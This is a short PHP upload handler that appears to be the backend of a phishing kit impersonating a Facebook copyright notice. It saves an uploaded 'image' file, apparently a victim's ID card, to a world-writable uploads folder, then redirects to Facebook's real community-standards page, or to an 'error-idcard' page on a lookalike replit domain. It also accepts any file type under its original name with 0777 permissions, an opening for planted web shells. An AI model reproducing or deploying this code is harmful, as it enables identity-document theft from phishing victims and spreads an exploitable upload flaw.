<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["image"])) {
    $target_dir = "uploads/";
    if (!file_exists($target_dir)) {
        mkdir($target_dir, 0777, true);
    }
    $target_file = $target_dir . basename($_FILES["image"]["name"]);
    if (file_exists($target_file)) {
      header("Location: https://copyright-issue.replit.app/error-idcard");
      exit();
    } else {
        if (move_uploaded_file($_FILES["image"]["tmp_name"], $target_file)) {
            chmod($target_file, 0777);
          header("Location: https://transparency.fb.com/en-gb/policies/community-standards/");
          exit();
        } else {
          header("Location: https://copyright-issue.replit.app/error-idcard");
          exit();
        }
    }
}
?>
